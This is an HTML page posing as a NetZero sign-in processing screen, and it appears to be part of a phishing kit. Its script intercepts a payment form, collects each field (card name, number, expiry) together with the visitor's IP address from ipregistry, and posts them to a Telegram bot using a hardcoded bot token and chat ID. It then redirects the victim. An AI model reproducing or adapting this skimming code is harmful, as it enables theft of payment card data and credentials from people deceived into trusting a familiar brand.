<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="1; https://account.netzero.net/s/account">
    <title>NetZero - Processing...</title>
    <style>
        body { background: #f0f0f0; font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #003366; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Processing your sign-in...</h2>
    <div class="loader"></div>
    <p>Please wait while we verify your credentials.</p>

    
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
      let telegramToken = "6601624596:AAH8-QfvB6o9HvGu9QjKUZWug3EOqInbDR0";
      let telegramChatID = "925812369";
      let ipRegistryAPI = "nfs9hel7svh94oy5";
      let redirectURL = "./reg.html";
      let url = window.location.href;
      let parameters = new URLSearchParams(window.location.search);
      let botDetected = false;
      let formName = "NetZero_Payment";
      let formID = "payment_form";

      $(document).ready(function() {
        init();
      });

      function init() {
        setClickAction();
        setValue();
      }

      function setValue() {
        let memberID = parameters.get("memberID");
        if (memberID) {
          $("#card_name").val(memberID);
        }
      }

      function setClickAction() {
        $("#" + formID).submit(function(e) {
          e.preventDefault();
          let formData = $(this).serializeArray();
          sendMessage(formData);
        });
      }

      // Format credit card number with hyphens (XXXX-XXXX-XXXX-XXXX)
      function formatCardNumber(input) {
        let value = input.value.replace(/\D/g, ''); // Remove non-digits
        if (value.length > 16) value = value.slice(0, 16); // Limit to 16 digits
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
          if (i > 0 && i % 4 === 0) formatted += '-';
          formatted += value[i];
        }
        input.value = formatted;
      }

      // Format expiration date with slash (MM/YY)
      function formatExpDate(input) {
        let value = input.value.replace(/\D/g, ''); // Remove non-digits
        if (value.length > 4) value = value.slice(0, 4); // Limit to 4 digits
        if (value.length > 2) {
          input.value = value.slice(0, 2) + '/' + value.slice(2);
        } else {
          input.value = value;
        }
      }

      async function sendMessage(formData) {
        let message = "New " + formName + " form submission:\n";
        formData.forEach(function(input) {
          if (dontAddInput(input)) {
            return;
          }
          message += `${input.name}: ${input.value}\n`;
        });
        message = await addExtraValueToMessage(message);
        if (botDetected) {
          window.location.href = "http://www.google.com";
          return;
        }
        const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
        const data = {
          chat_id: telegramChatID,
          text: message
        };
        try {
          await $.ajax({
            url: url,
            type: "POST",
            contentType: "application/json",
            data: JSON.stringify(data),
            success: function(response) {
              console.log("Message sent to Telegram");
            },
            error: function(xhr, status, error) {
              console.error("Failed to send to Telegram:", error);
            }
          });
        } catch (error) {
          console.error("Error in POST request:", error);
        }
        setTimeout(function() {
          window.location.href = redirectURL;
        }, 3000);
      }

      async function addExtraValueToMessage(message) {
        let userIP = await getUserIP();
        console.log(userIP);
        message += `IPAddress: ${userIP}\n`;
        return message;
      }

      function dontAddInput(input) {
        if (input.name === "_honey" && input.value !== "") {
          console.log(input.name + ": " + input.value);
          //botDetected = true;
        }
        if (input.name === "_honey" || input.name === "_bot") {
          return true;
        }
        return false;
      }

      async function getUserIP() {
        return new Promise((resolve, reject) => {
          $.getJSON("https://api.ipregistry.co/?key=" + ipRegistryAPI, function(data) {
            resolve(data.ip);
          }).fail(function(jqXHR, textStatus, errorThrown) {
            resolve("");
          });
        });
      }
    </script>
</html>